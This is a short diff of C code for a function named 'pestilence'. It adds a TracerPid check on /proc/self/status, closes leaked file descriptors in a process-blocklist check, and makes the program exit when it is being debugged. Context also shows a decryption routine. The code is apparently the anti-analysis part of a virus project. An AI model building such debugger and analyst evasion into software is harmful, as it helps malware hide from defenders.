@@ -62,6 +62,7 @@ void decrypt_rol(uint8_t *data, const size_t size, uint64_t key) {
 	}
 }
 
+
 static int	check_ptrace(void)
 {
 	if (_syscall(SYS_ptrace, PTRACE_TRACEME, 0, 0, 0) == -1)
@@ -155,18 +156,60 @@ static int forbid_proc(void)
 				ft_strlcat(new_path, comm, PATH_MAX);
 
 				if (check_proc(new_path) != 0) {
+					_syscall(SYS_close, fd);
 					return 1;
 				}
 			}
 		}
 	}
 
+	_syscall(SYS_close, fd);
+
 	return 0;
+}
+
+int is_debugged(void) {
+
+	int res = 0;
+	int fd = _syscall(SYS_open, ((char []){"/proc/self/status"}), O_RDONLY);
+
+	if (fd == -1)
+		return 1;
+
+	char buf[4096];
+
+	while (1) {
+		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
+		if (ret == -1) {
+			res = 1;
+			break;
+		}
+		if (ret == 0)
+			break;
+		buf[ret] = '\0';
+
+		char *ptr = ft_memmem(buf, ret, ((char []){"TracerPid:"}), 10);
+		if (ptr != 0) {
+			ptr += 10;
+			while (*ptr == ' ' || *ptr == '\t')
+				ptr++;
+			if (*ptr != '0') {
+				res = 1;
+				break;
+			}
+		}
+	}
+
+	_syscall(SYS_close, fd);
+	return res;
 }
 
 int pestilence(void)
 {
-	if (check_ptrace() != 0 || forbid_proc() != 0)
+	if (is_debugged() != 0) {
+		return 1;
+	}
+	if (forbid_proc() != 0)
 		return 1;
 	return 0;
 }
